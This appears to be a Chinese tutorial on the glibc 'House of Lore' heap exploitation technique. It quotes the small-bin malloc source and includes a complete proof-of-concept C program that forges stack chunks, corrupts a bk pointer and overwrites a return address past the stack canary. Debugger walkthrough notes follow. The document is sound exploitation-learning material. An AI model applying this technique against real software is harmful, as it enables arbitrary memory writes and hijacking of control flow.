# House of Lore

## 概述：

1. House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。
2. House of Lore 可以实现**分配任意指定位置的 chunk**，从而修改任意地址的内存。
3. House of Lore 利用的**前提是需要控制 Small Bin Chunk 的 bk 指针**，并且控制指定位置 chunk 的 fd 指针。

## 基本原理：

1. 如果在 malloc 的时候，申请的内存块在 small bin **范围内**，那么执行的流程如下：

   ```c
       /*
          If a small request, check regular bin.  Since these "smallbins"
          hold one size each, no searching within bins is necessary.
          (For a large request, we need to wait until unsorted chunks are
          processed to find best fit. But for small ones, fits are exact
          anyway, so we can check now, which is faster.)
        */
   
       if (in_smallbin_range(nb)) {
           // 获取 small bin 的索引
           idx = smallbin_index(nb);
           // 获取对应 small bin 中的 chunk 指针
           bin = bin_at(av, idx);
           // 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk
           // 如果 victim = bin ，那说明该 bin 为空。
           // 如果不相等，那么会有两种情况
           if ((victim = last(bin)) != bin) {
               // 第一种情况，small bin 还没有初始化。
               if (victim == 0) /* initialization check */
                   // 执行初始化，将 fast bins 中的 chunk 进行合并
                   malloc_consolidate(av);
               // 第二种情况，small bin 中存在空闲的 chunk
               else {
                   // 获取 small bin 中倒数第二个 chunk 。
                   bck = victim->bk;
                   // 检查 bck->fd 是不是 victim，防止伪造
                   if (__glibc_unlikely(bck->fd != victim)) {
                       errstr = "malloc(): smallbin double linked list corrupted";
                       goto errout;
                   }
                   // 设置 victim 对应的 inuse 位
                   set_inuse_bit_at_offset(victim, nb);
                   // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来
                   bin->bk = bck;
                   bck->fd = bin;
                   // 如果不是 main_arena，设置对应的标志
                   if (av != &main_arena) set_non_main_arena(victim);
                   // 细致的检查
                   check_malloced_chunk(av, victim, nb);
                   // 将申请到的 chunk 转化为对应的 mem 状态
                   void *p = chunk2mem(victim);
                   // 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff
                   alloc_perturb(p, bytes);
                   return p;
               }
           }
       }
   ```

   从下面的这部分我们可以看出，如果我们可以修改 small bin 的**最后一个 chunk 的 bk** 为我们指定内存地址的 fake chunk，并且同时 **满足bck->fd == victim** 的检测（需要伪造两个chunk），那么我们就可以使得 **small bin 的 bk 恰好为我们构造的 fake chunk**。也就是说，当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chunk：

   ```c
                   // 获取 small bin 中倒数第二个 chunk 。
                   bck = victim->bk;
                   // 检查 bck->fd 是不是 victim，防止伪造
                   if (__glibc_unlikely(bck->fd != victim)) {
                       errstr = "malloc(): smallbin double linked list corrupted";
                       goto errout;
                   }
                   // 设置 victim 对应的 inuse 位
                   set_inuse_bit_at_offset(victim, nb);
                   // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来
                   bin->bk = bck;
                   bck->fd = bin;
   ```


## 示例代码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void jackpot(){ puts("Nice jump d00d"); exit(0); }

int main(int argc, char * argv[]){


  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};

  fprintf(stderr, "\nWelcome to the House of Lore\n");
  fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
  fprintf(stderr, "This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");

  fprintf(stderr, "Allocating the victim chunk\n");
  intptr_t *victim = malloc(100);
  fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);

  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk = victim-2;

  fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1);
  fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2);

  fprintf(stderr, "Create a fake chunk on the stack");
  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
         "in second to the last malloc, which putting stack address on smallbin list\n");
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
         "chunk on stack");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;

  fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");
  void *p5 = malloc(1000);
  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);


  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free((void*)victim);

  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
  fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);

  void *p2 = malloc(1200);
  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);

  fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  //------------VULNERABILITY-----------

  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");

  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

  //------------------------------------

  fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
  fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");

  void *p3 = malloc(100);


  fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = malloc(100);
  fprintf(stderr, "p4 = malloc(100)\n");

  fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
         stack_buffer_2[2]);

  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
}
```

**但是需要注意的是：**

1. `void *p5 = malloc(1000);` 是为了防止和 victim_chunk 之后和 top_chunk 合并。
2. `free((void*)victim)`，victim 会被放入到 unsort bin 中去：
   * 然后下一次**分配的大小如果比它大**，那么将从 top chunk 上分配相应大小，而该 **chunk 会被取下 link 到相应的 bin 中** （smallbin 或是 large bin）。
   * 如果比它小 (相等则直接返回)，则从该 chunk 上切除相应大小，并返回相应 chunk，**剩下的成为 last reminder chunk , 还是存在 unsorted bin** 中。

## 调试分析：

1. 这三个位置的赋值，是为先后两次申请small bin时绕过检查的：

   ![image-20240729190133517](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291901589.png)

   第一处在fake_chunk的fd上放small bin中的chunk地址：

   ![image-20240729190224111](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291902167.png)

   第二三次赋值是为了**申请fake_chunk时绕过检查**：1. 在**fake_chunk的bk指针**放上fake_chunk2的地址，2. 在**fake_chunk2的fd指针**上放上fake_chunk1的地址：

   ![image-20240729190741074](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291908210.png)

1. 在这里打上断点，free后观察chunk状态：

   ![image-20240729180444858](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291804906.png)

   vicitim顺利进入unsorted bin：

   ![image-20240729180528527](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291805638.png)

2. 这里打断点，malloc之后再观察unsorted bin和small bin的状态：

   ![image-20240729180735511](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291807550.png)

   victim成功**进入small bin**：

   ![image-20240729180839109](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291809692.png)

3. 这里**修改victim的bk指针**：

   ![image-20240729181002115](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291810162.png)

   成功将bk指向栈上，且栈上的fake chunk的fd指针前面被修改指向victim（绕过检查）：

   ![image-20240729181626738](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291816896.png)

4. 申请一个small bin，下一次申请small bin时就会申请到fake chunk（当然也要绕过检查）：

   ![image-20240729181831798](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291921032.png)

   ![image-20240729184409545](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291844725.png)

5. 这里申请到fake chunk：

   ![image-20240729182240901](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291822945.png)

   ![image-20240729183132631](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291831697.png)

## 总结：

1. 要利用small bin实现任意地址分配chunk，要满足一下条件：
   * 能修改small bin中chunk（victim）的bk指针：victim-->bk=fake_chunk1。
   * 要能**伪造两个fake_chunk1、fake_chunk2**，修改**fake_chunk1的fd和bk指针**，修改**fake_chunk2的fd**指针:
     * fake_chunk1-->fd = victim 且 fake_chunk1-->bk = fake_chunk2
     * fake_chunk2-->fd = fake_chunk1
2. 最总实现的效果是，分配到fake_chunk1。